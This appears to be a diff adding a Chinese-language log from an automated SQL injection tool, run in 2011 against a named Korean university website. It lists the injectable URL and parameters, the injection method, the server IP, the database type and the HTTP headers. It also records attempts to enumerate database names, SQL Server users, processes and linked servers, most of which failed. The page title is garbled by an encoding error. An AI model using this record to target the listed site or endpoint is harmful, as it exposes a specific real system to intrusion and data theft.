@@ -1,0 +1,52 @@
+■漏洞信息:============================================================
+ ·URL:http://www.mediaent.ac.kr/board/list.asp?sm=6_2&board_id=mec_news&b_category=0&search_category=&searchstring=&gotopage=
+ ·页面标题：版扁措 固叼绢浚磐抛牢刚飘背腊盔
+ ·参数:sm=6_2&board_id=mec_news&b_category=0&search_category=&searchstring=&gotopage=
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:222.122.213.158
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 12:05:18 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Pragma: No-Cache
+P3P: CP=ALL CURa ADMa DEVa TAIa OUR BUS IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC OTC
+Pragma: No-Cache
+P3P: CP=ALL CURa ADMa DEVa TAIa OUR BUS IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC OTC
+Content-Length: 113022
+Content-Type: text/html
+Expires: Sat, 02 Apr 2011 19:25:18 GMT
+Set-Cookie: ASPSESSIONIDQACCABBR=JDMFLAODHJPIKHDDCOAGKLPM; path=/
+Cache-control: Private
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
